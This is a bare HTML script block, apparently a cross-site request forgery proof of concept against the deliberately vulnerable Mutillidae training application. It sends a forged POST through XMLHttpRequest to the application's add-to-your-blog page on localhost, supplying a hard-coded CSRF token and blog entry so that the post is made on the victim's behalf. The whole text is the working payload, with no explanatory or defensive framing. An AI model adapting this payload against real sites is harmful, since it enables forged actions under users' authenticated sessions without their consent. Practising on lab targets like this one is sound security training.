
<script>
        var http = new XMLHttpRequest();
	var url= "";
	url = url.concat("csrf-token=15554%26blog_entry=blog1%26add-to-your-blog-php-submit-button=Save+Blog+Entry");


	http.open("POST", "https://localhost/mutillidae/index.php?page=add-to-your-blog.php", true);
	http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	http.setRequestHeader("Content-Length", url.length);
	http.send(url);
</script>
